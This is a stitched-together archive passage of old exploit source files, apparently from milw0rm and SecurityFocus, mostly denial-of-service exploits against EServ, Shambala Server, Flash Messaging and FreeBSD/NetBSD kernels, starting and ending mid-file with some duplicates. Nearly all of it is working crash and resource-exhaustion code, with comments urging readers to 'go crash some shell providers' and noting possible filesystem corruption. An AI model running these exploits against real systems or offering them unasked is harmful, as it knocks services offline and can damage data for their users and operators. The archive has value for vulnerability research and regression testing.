    tcphdr->ack_seq   = htonl(rand());
    tcphdr->doff   = ((sizeof(TCP)+4) / 4);
    tcphdr->check=0;
    tcphdr->fin     = 0;
    tcphdr->syn     = 1;
    tcphdr->rst     = 0;
    tcphdr->psh     = 0;
    tcphdr->ack     = 0;
    tcphdr->urg     = 0;
    tcphdr->window   = htons(5840);
    memcpy(ip+12, ((unsigned char *)pkt)+sizeof(IP), pLen - sizeof(IP));
    tcphdr->check = ipChecksum((u_short *)&ip, sIPLen);
 
   sendto(sockfd, pkt, pLen, 0, (struct sockaddr *)&host, sizeof(host));

   return 0;
}

// milw0rm.com [2007-04-13]
source: http://www.securityfocus.com/bid/7552/info
 
A denial of service vulnerability has been reported for EServ. The vulnerability exists due to the way the server handles connections. Specifically, memory allocated for open connections are not properly freed when a connection no longer exists. This will result in a consumption of all available memory resources.
 
**It has been reported that EServ version 3.0 previously thought to be invulnerable to this issue is affected by this vulnerability. This version was tested on Windows 2000.
 
This vulnerability affects EServ 2.92 to 3.0. 

/* m00-eServ-fun.c
 *
 *  EServ/2.95-3.00 remote memory-leak exploit
 *
 *  Result: exiting program and close all services
 *  if you seen message: Broken pipe
 *  then may going drink beer 8)
 *
 *  Eserv 3.0 only web(80) services susceptible on this DoS
 *
 *  rash / m00.void.ru
 */

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(int argc, char *argv[])
{  
  char buf[2000];
  int fd;
  struct sockaddr_in rsin;

  if (argc!=3) {
   printf("\n usage: %s <ip> <port>\n\n", argv[0]);
   exit(0);  
  }
  
  rsin.sin_family = AF_INET;
  rsin.sin_port   = htons(atoi(argv[2]));
  rsin.sin_addr.s_addr = inet_addr(argv[1]);
 
  for (fd=0;fd<2000;fd++)
    buf[fd]=(int *)((rand()*10));
  
  fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);             
  if (connect(fd,(struct sockaddr *)&rsin,sizeof(struct sockaddr))) perror("[-] connect()"),exit(0);
  printf("[+] connected..\n"); 
  printf("[+] send data to host..\n"); 
  
  while (1) {
   if ((send(fd, buf, 2000, 0))<0)      
     break;  
  }   
}

source: http://www.securityfocus.com/bid/4897/info

Shambala Server is a FTP, Web, and Chat server targeted for the Small Office/Home Office user.

It has been reported that Shambala Server's web server may be prone to a denial of service vulnerability. The denial of service condition is a result of the web server failing to handle malformed requests. 

/******** shambalax.c ***********************************************************

*                                                       			*

* PoC exploit for the DoS in Shambala Server 4.5        			*

* as described in Telhack 026 Inc. S.A. #3 (BID:4897).  			*

* I have also built in a function that exploits another 			*

* DoS condition found by zillion a long long time ago.  			*

* Also refined my DoS a little bit by just using one                            *

* char that mess up Shambala.                                                   *

*                                                       			*

* By: Daniel Nystr�m (excE) <exce@netwinder.nu>         			*

*                                                       			*

*                                                       			*

* Notes:                                                                        *

* I found that zillion had only been almost right, it                           * 

* is not opening a lot of TCP connection that generates                         *

* the DoS that he found, it is just one TCP connection,                         *

* but it certainly has to do with bad connection handling                       *

* by Shambala.                                                                  *

*                                                                               *

*                                                                               *

*                                                                               *

* Credits:                                                                      *

* Zillion <zillion@safemode.org> - for discovering the FTP DoS                  *

*                                                       			*

* Greetz:                                                                       *

* Xenogen <*****@**********.***> - for promising to report any segfaults :)     *

* X-Rewt  <*****@**********.***> - Cuz he's in my school :P                     *

* Telhack 026 Inc. crew - STOP phreaking, START doing something more fun :))    *

*                                                                               *

*********************************************************** shambalax.c ********/



#include <stdio.h>

#include <stdlib.h>

#include <errno.h>

#include <string.h>

#include <sys/types.h>

#include <netinet/in.h>

#include <netdb.h>

#include <sys/socket.h>





int main(int argc, char *argv[])

{

	int sockfd;

	int port;

	int numbytes;

	

	struct sockaddr_in target;

	struct hostent *he;



	if (argc != 3)

	{

		fprintf(stderr, "\n-- Shambala Server 4.5 DoS exploit --\n");

		fprintf(stderr, "\nUsage: %s <target> <type>", argv[0]);

		fprintf(stderr, "\nTypes:");

		fprintf(stderr, "\n1  -  HTTPD DoS");

		fprintf(stderr, "\n2  -  FTP DoS\n\n");

		exit(1);

	}

	

	printf("\n-- Shambala Server 4.5 DoS exploit --\n\n");

	printf("-> Starting...\n");	

	printf("->\n");



	if ((he=gethostbyname(argv[1])) == NULL)

	{

		herror("gethostbyname");

		exit(1);

	}



	if ((sockfd=socket(AF_INET, SOCK_STREAM,0)) == -1)

	{

		perror("socket");

		exit(1);

	}



	/* HTTPD DoS */

	if(argv[2][0] == '1')

	{

		port = 80;

		target.sin_family = AF_INET;

		target.sin_port = htons(port);

		target.sin_addr = *((struct in_addr *)he->h_addr);

		bzero(&(target.sin_zero), 8);

		printf("-> Connecting to %s:80...\n", inet_ntoa(target.sin_addr));

		printf("->\n");

		if (connect(sockfd, (struct sockaddr *)&target, sizeof(struct sockaddr)) == -1)

		{

			perror("connect");

			exit(1);

		}

		printf("-> Sending httpd exploit string!! M4y th3 3v1L Shambala d13!!! :)\n");	

		printf("->\n");

		if(send(sockfd, "!\r\n", 3, 0) == -1)

		{

			perror("send");

			exit(1);

		}	

		close(sockfd);

	}

	else

	

	/* FTPD DoS */

	if(argv[2][0] == '2')

	{

                port = 21;

                target.sin_family = AF_INET;

                target.sin_port = htons(port);

                target.sin_addr = *((struct in_addr *)he->h_addr);

                bzero(&(target.sin_zero), 8);

                printf("-> Making a TCP connection (!which crashes server!) to %s:21...\n", inet_ntoa(target.sin_addr));

                printf("->\n");

                if (connect(sockfd, (struct sockaddr *)&target, sizeof(struct sockaddr)) == -1)

                {

                        perror("connect");

                        exit(1);

                }

                close(sockfd);

	}

	else

	{

		fprintf(stderr, "\n\nError: Bad type definition (use 1 or 2 for <type>).\n\n");

		exit(1);		

	}



	printf("-> Exploit finished nicely. %s's Shambala is probably dead by now.\n\n", argv[1]);



}



/* EOF - Shambala Server 4.5 DoS exploit     */

/* Daniel Nystr�m (excE) <exce@netwinder.nu> *//*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
/*

Show_dump 0.1

    Copyright 2004 Luigi Auriemma

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307 USA

    http://www.gnu.org/licenses/gpl.txt

function to show the hex dump of a buffer

Usage:

    to show the hex dump on the screen:
        show_dump(buffer, buffer_length, stdout);

    to write the hex dump in a file or other streams:
        show_dump(buffer, buffer_length, fd);

    (if you know C you know what FILE *stream means 8-)
*/



void show_dump(unsigned char *buff, unsigned long buffsz, FILE *stream) {
    const char      *hex = "0123456789abcdef";
    unsigned char   buffout[68],
                    *pout,
                    *p1,
                    *p2,
                    i,
                    rest;


    p1 = buff;
    p2 = buff;

    while(buffsz) {

        pout = buffout;
        if(buffsz < 16) rest = buffsz;
            else rest = 16;

        for(i = 0; i < rest; i++, p1++) {
            *pout++ = hex[*p1 >> 4];
            *pout++ = hex[*p1 & 0xf];
            *pout++ = 0x20;
        }

        for(i = pout - buffout; i < 50; i++, pout++) *pout = 0x20;

        for(i = 0; i < rest; i++, p2++, pout++) {
            if(*p2 >= 0x20) *pout = *p2;
                else *pout = 0x2e;
        }

        *pout++ = 0x0a;
        *pout   = 0x00;

        fputs(buffout, stream);
        buffsz -= rest;
    }
}




#ifdef WIN32
    #include <winsock.h>
/*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include <string.h>
#include <errno.h>



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = "Interrupted system call"; break;
        case 10009: error = "Bad file number"; break;
        case 10013: error = "Permission denied"; break;
        case 10014: error = "Bad address"; break;
        case 10022: error = "Invalid argument (not bind)"; break;
        case 10024: error = "Too many open files"; break;
        case 10035: error = "Operation would block"; break;
        case 10036: error = "Operation now in progress"; break;
        case 10037: error = "Operation already in progress"; break;
        case 10038: error = "Socket operation on non-socket"; break;
        case 10039: error = "Destination address required"; break;
        case 10040: error = "Message too long"; break;
        case 10041: error = "Protocol wrong type for socket"; break;
        case 10042: error = "Bad protocol option"; break;
        case 10043: error = "Protocol not supported"; break;
        case 10044: error = "Socket type not supported"; break;
        case 10045: error = "Operation not supported on socket"; break;
        case 10046: error = "Protocol family not supported"; break;
        case 10047: error = "Address family not supported by protocol family"; break;
        case 10048: error = "Address already in use"; break;
        case 10049: error = "Can't assign requested address"; break;
        case 10050: error = "Network is down"; break;
        case 10051: error = "Network is unreachable"; break;
        case 10052: error = "Net dropped connection or reset"; break;
        case 10053: error = "Software caused connection abort"; break;
        case 10054: error = "Connection reset by peer"; break;
        case 10055: error = "No buffer space available"; break;
        case 10056: error = "Socket is already connected"; break;
        case 10057: error = "Socket is not connected"; break;
        case 10058: error = "Can't send after socket shutdown"; break;
        case 10059: error = "Too many references, can't splice"; break;
        case 10060: error = "Connection timed out"; break;
        case 10061: error = "Connection refused"; break;
        case 10062: error = "Too many levels of symbolic links"; break;
        case 10063: error = "File name too long"; break;
        case 10064: error = "Host is down"; break;
        case 10065: error = "No Route to Host"; break;
        case 10066: error = "Directory not empty"; break;
        case 10067: error = "Too many processes"; break;
        case 10068: error = "Too many users"; break;
        case 10069: error = "Disc Quota Exceeded"; break;
        case 10070: error = "Stale NFS file handle"; break;
        case 10091: error = "Network SubSystem is unavailable"; break;
        case 10092: error = "WINSOCK DLL Version out of range"; break;
        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
        case 10071: error = "Too many levels of remote in path"; break;
        case 11001: error = "Host not found"; break;
        case 11002: error = "Non-Authoritative Host not found"; break;
        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
        case 11004: error = "Valid name, no data record of requested type"; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, "\nError: %s\n", error);
    exit(1);
}

    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <netinet/in.h>
#endif



#define VER     "0.1"
#define PORT    645
#define BUFFSZ  8192
#define TIMEOUT 3
#define LOGIN   "\xd1" "3" \
                "\xd1" "1" \
                "\xd1" "10/07/2004" /* date */ \
                "\xd1" "00.00.00"   /* time (hh.mm.ss) */ \
                "\xd1" \
                "\xd1" \
                "\xd1" "%s"         /* nickname */ \
                "\xd1" \
                "\xd1" "000000" \
                "\xd1"



int timeout(int sock);
void flashmsg_algo(u_char *data, int len);
u_long resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int         sd,
                i,
                len,
                nonull = 0,
                chr    = 0x69;
                /* the normal chr must be 0x00, and if it is different */
                /* causes the immediate crash of the server */
    u_short     port = PORT;
    u_char      buff[BUFFSZ],
                pck[BUFFSZ >> 1],
                *p,
                *nickname = "crash";


    setbuf(stdout, NULL);

    fputs("\n"
        "Flash Messaging <= 5.2.0g (rev 1.1.2) server crash and decoder "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s [options] <server>\n"
            "\n"
            "Options:\n"
            "-p PORT   specify the server port (default %d)\n"
            "-s NICK   this tool will act as a client emulator and will show any decoded\n"
            "          message or command sent by the server to you.\n"
            "          You must also specify the nickname you wanna use\n"
            "          By default this tool is a proof-of-concept ables to crash the server\n"
            "-n        use this option to see any server data in a more comprehensible text\n"
            "          format. By default any data block is showed in hexadecimal mode\n"
            "\n", argv[0], PORT);
        exit(1);
    }

    argc--;
    for(i = 1; i < argc; i++) {
        switch(argv[i][1]) {
            case 'p': port = atoi(argv[++i]); break;
            case 's': {
                chr = 0x00;
                nickname = argv[++i];
                } break;
            case 'n': nonull = 1; break;
            default: {
                printf("\nError: wrong command-line argument (%s)\n\n", argv[i]);
                exit(1);
            }
        }
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    peer.sin_addr.s_addr = resolv(argv[argc]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();

    printf("- target   %s:%hu\n",
        inet_ntoa(peer.sin_addr),
        port);
    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();

    fputs("- prepare login data\n", stdout);
    len = snprintf(
        pck,
        sizeof(pck) - 1,
        LOGIN,
        nickname);
    if((len < 0) || (len > sizeof(pck))) {
        fputs("\nError: the nickname you have inserted is longer than my buffer\n\n", stdout);
        exit(1);
    }

    p = buff;
    for(i = 0; i < len; i++) {
        *p++ = pck[i];
        *p++ = chr;
    }

    len <<= 1;
    flashmsg_algo(buff, len);

    fputs("- send login data\n", stdout);
    if(send(sd, buff, len, 0)
      < 0) std_err();

    if(chr) {
        fputs("- check server\n", stdout);
        if((timeout(sd) < 0) || ((len = recv(sd, buff, BUFFSZ, 0)) <= 0)) {
            fputs("\nServer IS vulnerable!!!\n\n", stdout);
        } else {
            fputs("\nServer doesn't seem vulnerable, check its decoded reply:\n", stdout);
            show_dump(buff, len, stdout);
        }
    } else {
        for(;;) {
            len = recv(sd, buff, BUFFSZ, 0);
            if(len < 0) std_err();
            if(!len) break;
            flashmsg_algo(buff, len);
            if(nonull) {
                p = buff;
                for(i = 0; i < len; i += 2, p++) {
                    *p = buff[i];
                    if(*p == 0xd1) *p = '\n';   // 0xd1 = delimiter
                }
                *p = 0x00;
                printf("\n--------------------\n%s", buff);
            } else {
                fputc('\n', stdout);
                show_dump(buff, len, stdout);
            }
        }
    }

    close(sd);

    return(0);
}



void flashmsg_algo(u_char *data, int len) {
    int     i;
    const static u_char encdata[] =
            "ScratchIt" "YouFool";

    for(i = 0; i < len; i++) {
        *data++ ^= encdata[i & 15] - 38;
        *data++ ^= 38;
    }
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_long resolv(char *host) {
    struct  hostent *hp;
    u_long  host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolve hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif




// milw0rm.com [2004-03-02]
#include <stdio.h>

#include <ft2build.h>
#include FT_FREETYPE_H

int
main(int argc, char *argv[]) {
  FT_Library    library;
  FT_Face       face;

  if (argc != 2) {
      printf("Usage: %s <test-file>\n\n", argv[0]);
      return 1;
  }

  FT_Init_FreeType( &library );              /* initialize library */
  FT_New_Face( library, argv[1], 0, &face ); /* create face object */
  FT_Done_FreeType( library );

  return 0;
}
source: http://www.securityfocus.com/bid/653/info

A vulnerability exists in FreeBSD's new VFS cache introduced in version 3.0 that allows a local and possibly remote user to force the kernel to consume large quantities of wired memory thus creating a denial of service condition. The new VFS cache has no way to purge entries from memory while the file is open, consuming wired memory and allowing for the denial of service (memory that cannot be swapped out).

FreeBSD versions earlier than 3.0 are not vulnerable, nor is the original 4.4BSD-Lite code. 

#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>

#define	NFILE	64
#define	NLINK	30000
#define	NCHAR	245

int
main()
{
	char junk[NCHAR+1],
	     dir[2+1+2+1], file1[2+1+2+1+NCHAR+3+1], file2[2+1+2+1+NCHAR+3+1];
	int i, j;
	struct stat sb;

	memset(junk, 'x', NCHAR);
	junk[NCHAR] = '\0';
	for (i = 0; i < NFILE; i++) {
		printf("\r%02d/%05d...", i, 0),
		fflush(stdout);
		sprintf(dir, "%02d-%02d", i, 0);
		if (mkdir(dir, 0755) < 0)
			fprintf(stderr, "mkdir(%s) failed\n", dir),
			exit(1);
		sprintf(file1, "%s/%s%03d", dir, junk, 0);
		if (creat(file1, 0644) < 0)
			fprintf(stderr, "creat(%s) failed\n", file1),
			exit(1);
		if (stat(file1, &sb) < 0)
			fprintf(stderr, "stat(%s) failed\n", file1),
			exit(1);
		for (j = 1; j < NLINK; j++) {
			if ((j % 1000) == 0) {
				printf("\r%02d/%05d...", i, j),
				fflush(stdout);
				sprintf(dir, "%02d-%02d", i, j/1000);
				if (mkdir(dir, 0755) < 0)
					fprintf(stderr, "mkdir(%s) failed\n", dir),
					exit(1);
			}
			sprintf(file2, "%s/%s%03d", dir, junk, j%1000);
			if (link(file1, file2) < 0)
				fprintf(stderr, "link(%s,%s) failed\n", file1, file2),
				exit(1);
			if (stat(file2, &sb) < 0)
				fprintf(stderr, "stat(%s) failed\n", file2),
				exit(1);
		}
	}
	printf("\rfinished successfully\n");
}
source: http://www.securityfocus.com/bid/1173/info

A vulnerability exists in the 1.4.x NetBSD kernel that may allow remote attackers to cause the machine to kernel panic on certain architectures. By sending a packet to a machine running the Alpha or SPARC versions of NetBSD, with an unaligned IP timestamp option, it is possible to cause the kernel to perform an unaligned memory access. This will cause a panic, causing the machine to reboot.

x86 and arm32 platforms have a similar bug. However, as both of these architectures can perform unaligned memory accesses, this vulnerability does not cause them to panic.

It was later determined that FreeBSD, a 4.xBSD derivative like NetBSD, is also vulnerable to this problem.


#include <stdio.h>
#include <libnet.h>
/* Remote denial-of-service in IP stack 
   simple exploit by y3t1
                     y3t1@rast.lodz.pdi.net

Gretzzz : rastlin,z33d,vanitas,DYZIU,Kuki,vx,zx,korie,kaneda,
          d3cker&mroowka,jarv33s,funkySh,Shadow,tmoggie
	  all from :
	           #hwa.hax0r.news@efnet
	           #darnet@efnet
*/
int rand_n(u_long zakres)
{
  return 1+(int) ((float)zakres*rand()/(RAND_MAX+1.0));
}

int main(int argc, char **argv)
{
    char a;
    int sock, c,pkt,ile;
    struct hostent *host;
    u_long src_ip, dst_ip;
    u_char *buf;
    u_char options[4];
    int option_s  = sizeof(options);
    struct ipoption ipopt;
    srand(time(NULL));
    ile=100; 
    printf("  -= Remote denial-of-service in IP stack =- \n");
    printf("\n");
    printf("                          by y3t1/team140\n");
    printf("                             y3t1@rast.lodz.pdi.net \n");
    printf("\n");
    if  (argc < 4) 
    {
     printf("%s -s src_addr -d dst_addr -p packets\n",argv[0]);
     printf(" -s src_addr - source address \n");
     printf(" -d dst_addr - dest address \n");
     printf(" -p packets - how many packets send to dest (default 100)\n");
     exit(1);
    }
   opterr=0;
   while((a=getopt(argc,argv,"s:d:p:"))!=EOF)
   {
	switch(a) {
	 case 's': { 
	           if ((host=gethostbyname(optarg))!=NULL)
		   bcopy(host->h_addr,&src_ip,host->h_length);
		   else src_ip=inet_addr(optarg);
		   break;
		   }
	 case 'd': {   
	           if ((host=gethostbyname(optarg))!=NULL)
		   bcopy(host->h_addr,&dst_ip,host->h_length);
		   else dst_ip=inet_addr(optarg);
	      	   break;
                   }
         case 'p': {
	            ile=atoi(optarg);
		    break; 
		   }
	 }
   }
    bzero(options,option_s);
    buf = malloc(IP_MAXPACKET);
    if (!buf)
    {
        perror("malloc");
        exit(-1);
    }
    sock = libnet_open_raw_sock(IPPROTO_RAW);
    if (sock == -1)
    {
        perror("socket");
        exit(-1);
    }
    libnet_build_ip(LIBNET_ICMP_H ,0,242,0,48,IPPROTO_ICMP,src_ip,dst_ip,NULL,0,buf);                          
    memcpy(ipopt.ipopt_list, options, option_s);
    *(ipopt.ipopt_list)     = IPOPT_RR;
    *(ipopt.ipopt_list+1)   = 3;
    *(ipopt.ipopt_list+2)   = 0xff;
    *(ipopt.ipopt_list+3)   = 0;
    c = libnet_insert_ipo(&ipopt,option_s,buf);                                                
    if (c == -1)
    {
        printf("Error\n");
	exit(1);
    }
    libnet_build_icmp_echo(ICMP_ECHO,0,242,31337,NULL,0,buf+LIBNET_IP_H+option_s);
    if (libnet_do_checksum(buf,IPPROTO_ICMP,LIBNET_ICMP_ECHO_H)==-1)
    {
     printf("can't do checksum \n");
    }
 for (pkt=0;pkt<ile;pkt++)
 {
    buf[22]=rand_n(0xff);
    c = libnet_write_ip(sock, buf, LIBNET_ICMP_ECHO_H + LIBNET_IP_H + option_s);
 }
    free(buf);
    libnet_close_raw_sock(sock);   
}
source: http://www.securityfocus.com/bid/1296/info

A denial of service attack exists that affects FreeBSD, NetBSD and OpenBSD. It is believed that all versions of these operating systems are vulnerable. The vulnerability is related to setting socket options regarding the size of the send and receive buffers on a socketpair. By setting them to certain values, and performing a write the size of the value the options have been set to, FreeBSD can be made to panic. NetBSD and OpenBSD do not panic, but network applications will stop responding.

Details behind why this happens have not been made available. 

#include        <unistd.h>
#include        <sys/socket.h>
#include        <fcntl.h> 
        
#define         BUFFERSIZE      204800

extern  int
main(void)
{
        int             p[2], i;
        char            crap[BUFFERSIZE]; 

        while (1)
        {
                if (socketpair(AF_UNIX, SOCK_STREAM, 0, p) == -1)
                        break;
                i = BUFFERSIZE;
                setsockopt(p[0], SOL_SOCKET, SO_RCVBUF, &i,
sizeof(int));
                setsockopt(p[0], SOL_SOCKET, SO_SNDBUF, &i, 
sizeof(int));
                setsockopt(p[1], SOL_SOCKET, SO_RCVBUF, &i,
sizeof(int));   
                setsockopt(p[1], SOL_SOCKET, SO_SNDBUF, &i,
sizeof(int));
                fcntl(p[0], F_SETFL, O_NONBLOCK);
                fcntl(p[1], F_SETFL, O_NONBLOCK);
                write(p[0], crap, BUFFERSIZE);
                write(p[1], crap, BUFFERSIZE);
        }
        exit(0);
}       
source: http://www.securityfocus.com/bid/10596/info


It is reported that FreeBSD running on the Alpha architecture is susceptible to a denial of service vulnerability in its execve() system call.

An attacker with local interactive user-level access on an affected machine is reportedly able to crash FreeBSD when running on the Alpha architecture, denying service to legitimate users.

FreeBSD 5.1-RELEASE/Alpha is reported vulnerable, other architectures with strict memory alignment requirements are also likely vulnerable. IA32 is reported immune. Versions other than 5.1-RELEASE are likely affected as well. 

/*
 * FreeBSD/Alpha local DoS
 *    by Marceta Milos
 *    root@marcetam.net
 *
 */

char main() { execve("/bin/ls",(int *)(main + 1), 0); }
source: http://www.securityfocus.com/bid/622/info

A denial of service attack exists that affects FreeBSD, NetBSD and OpenBSD, and potentially other operating systems based in some part on BSD. It is believed that all versions of these operating systems are vulnerable. The vulnerability is related to setting socket options regarding the size of the send and receive buffers on a socketpair. By setting them to certain values, and performing a write the size of the value the options have been set to, FreeBSD can be made to panic. NetBSD and OpenBSD do not panic, but network applications will stop responding.

Details behind why this happens have not been made available. 

#include <unistd.h>
#include <sys/socket.h>
#include <fcntl.h>

#define BUFFERSIZE 204800

extern int
main(void)
{
int p[2], i;
char crap[BUFFERSIZE];

while (1)
{
if (socketpair(AF_UNIX, SOCK_STREAM, 0, p) == -1)
break;
i = BUFFERSIZE;
setsockopt(p[0], SOL_SOCKET, SO_RCVBUF, &i, sizeof(int));
setsockopt(p[0], SOL_SOCKET, SO_SNDBUF, &i, sizeof(int));
setsockopt(p[1], SOL_SOCKET, SO_RCVBUF, &i, sizeof(int));
setsockopt(p[1], SOL_SOCKET, SO_SNDBUF, &i, sizeof(int));
fcntl(p[0], F_SETFL, O_NONBLOCK);
fcntl(p[1], F_SETFL, O_NONBLOCK);
write(p[0], crap, BUFFERSIZE);
write(p[1], crap, BUFFERSIZE);
}
exit(0);
}



  	#include <sys/types.h>
#include <sys/ptrace.h>
#include <unistd.h>
/* lol lol, exploit for http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=419
thank you oh unknown, sincerely kokanin@gmail. usage: ./blah <pid you own> */

int main(int argc, char *argv[]){
	struct ptrace_lwpinfo *lol;
	ptrace(PT_ATTACH,atoi(argv[1]),NULL,0);
	wait(NULL);
	ptrace(PT_LWPINFO,atoi(argv[1]),(void *)&lol,32768);
}

// milw0rm.com [2006-10-12]
source: http://www.securityfocus.com/bid/20517/info

FreeBSD is prone to a local denial-of-service vulnerability because the kernel fails to require superuser privileges to perform a sensitive operation.

An attacker may leverage this issue to consume all CPU resources, denying service to legitimate users.

FreeBSD versions 5.5-RELEASE through 6.0-RELEASE-p10 are vulnerable to this issue; previous versions may also be affected.

/* FreeBSD cvs commit: src/sys/posix4/p1003_1b.c davidxu 2006-05-21 00:40:38 UTC
   Log: Don't allow non-root user to set a scheduler policy, otherwise this could be a local DOS.
   lol lol, thatz true. kokanin@gmail lolling it out in '06 !"#%&%(20061013)(="#"! 
   tested on FreeBSD 5.5-RELEASE, 6.0-RELEASE-p5, 6.1-RELEASE, 6.1-RELEASE-p10 (latest at the time of writing)
   wow, that sort of makes this 0day local freebsd denial of service for non-CURRENT or whatever.
   usage: ./run me and wait a moment.. woo, it's friday the 13th, go crash some shell providers.
*/
#include <sched.h>
int main(){
struct sched_param lol; 
lol.sched_priority = sched_get_priority_max(SCHED_FIFO); 
sched_setscheduler(0,SCHED_FIFO,&lol);
for(;;){}
}source: http://www.securityfocus.com/bid/20158/info

FreeBSD is prone to multiple local denial-of-service vulnerabilities. These issues occur because of input-validation flaws related to the handling of integers.

An attacker may leverage these issues to cause the affected computer to crash, denying service to legitimate users.

Versions 5.2 through 5.5 are vulnerable to these issues; other versions may also be affected.

#include <stdio.h>
#include <stdlib.h>
#include <machine/segments.h>
#include <machine/sysarch.h>

int main(int argc,char **argv){

    if(i386_set_ldt(LUDATA_SEL+1,NULL,-1)==-1){
        perror("i386_set_ldt");
        exit(EXIT_FAILURE);
    }

    exit(EXIT_FAILURE);
}/* atapanic.c
 *
 * by Shaun Colley, 13 July 2009
 *
 * this panics the freebsd kernel by passing a large value to malloc(9) in one of
 * fbsd's ata ioctl's.  tested on freebsd 6.0 and 8.0.  you need read access to the
 * ata device in /dev to be able to open() the device.  chain with some race condition
 * bug?
 *
 * - shaun
 *
 */


#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <fcntl.h>

struct ata_ioc_requestz {
    union {
	struct {
	    u_int8_t            command;
	    u_int8_t            feature;
	    u_int64_t           lba;
	    u_int16_t           count;
	} ata;
	struct {
	    char                ccb[16];
	} atapi;
    } u;

    caddr_t             data;
    int                 count;
    int                 flags;

    int                 timeout;
    int                 error;
};


#define IOCATAREQUEST           _IOWR('a', 100, struct ata_ioc_requestz)

int main() {

struct ata_ioc_requestz evil;
int fd;

evil.count = 0xffffffff;
fd = open("/dev/acd0", O_RDONLY);  /* /dev/acd0 is one of my ata devices */

ioctl(fd, IOCATAREQUEST, &evil);

/* should never reach here if kernel panics */
return 0;    
}

// milw0rm.com [2009-07-13]
source: http://www.securityfocus.com/bid/20522/info

FreeBSD is prone to a local denial-of-service vulnerability because it fails to handle exceptional conditions.

An attacker may leverage this issue to crash the affected computer, denying service to legitimate users. Under certain conditions, successful exploits may also corrupt the filesystem.

FreeBSD version 6.0-RELEASE-p5 and 6.1-RELEASE-p10 are vulnerable to this issue; other versions may also be affected.

/* FreeBSD cvs commit: src/sys/ufs/ufs/ufs_vnops.c maxim 2006-05-31 13:15:29 UTC
   Log: According to POSIX, the result of ftruncate(2) is unspecified
   for file types other than VREG, VDIR and shared memory objects.
   We already handle VREG, VLNK and VDIR cases.  Silently ignore
   truncate requests for all the rest. PR kern/98064

   lol lol, thatz true. kokanin@gmail lolling it out in '06 !"#%&%(20061013)(="#"!
   tested on FreeBSD 6.0-RELEASE-p5, 6.1-RELEASE-p10 (latest at the time of writing)
   - it just makes the system reboot, and with a bit of luck fucks up the filesystem.
   wow, that sort of makes this 0day local freebsd denial of service for non-CURRENT or whatever.
   usage: ./run me and wait a moment.. woo, it's friday the 13th, go crash some shell providers.
   
*/

#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

int main(){
mkfifo("lol",0x1b6);
int fd = open("lol",O_RDWR); 
ftruncate(fd,12345);
close(fd);
}// Evgeny Legerov (elegerov.blogspot.com)

#include unistd.h
#include sys/types.h
#include stdio.h
#include fcntl.h
#include crypto/cryptodev.h

int main()
{
        int fd2, fd;
        struct crypt_kop kop;

        printf("FreeBSD 6.1 /dev/crypto local kernel DoS\n");

        fd2 = open("/dev/crypto", O_RDWR, 0);
        if (fd2 == -1){
                perror("open");
                exit(-1);
        }

        if (ioctl(fd2, CRIOGET, &fd) == -1) {
                perror("ioctl");
                exit(-1);
        }

        kop.crk_op = CRK_MOD_EXP;
        kop.crk_iparams = 3;
        kop.crk_oparams = 1;
        kop.crk_param[0].crp_nbits = 0x70000000;

        ioctl(fd, CIOCKEY, &kop);

        printf("exploit failed\n");

        return 0;
}

// milw0rm.com [2006-10-24]
/* FreeBSD cvs commit: src/sys/posix4/p1003_1b.c davidxu 2006-05-21 00:40:38 UTC
   Log: Don't allow non-root user to set a scheduler policy, otherwise this could be a local DOS.
   lol lol, thatz true. kokanin@gmail lolling it out in '06 !"#%&%(20061013)(="#"! 
   tested on FreeBSD 5.5-RELEASE, 6.0-RELEASE-p5, 6.1-RELEASE, 6.1-RELEASE-p10 (latest at the time of writing)
   wow, that sort of makes this 0day local freebsd denial of service for non-CURRENT or whatever.
   usage: ./run me and wait a moment.. woo, it's friday the 13th, go crash some shell providers.
*/
#include <sched.h>
int main(){
struct sched_param lol; 
lol.sched_priority = sched_get_priority_max(SCHED_FIFO); 
sched_setscheduler(0,SCHED_FIFO,&lol);
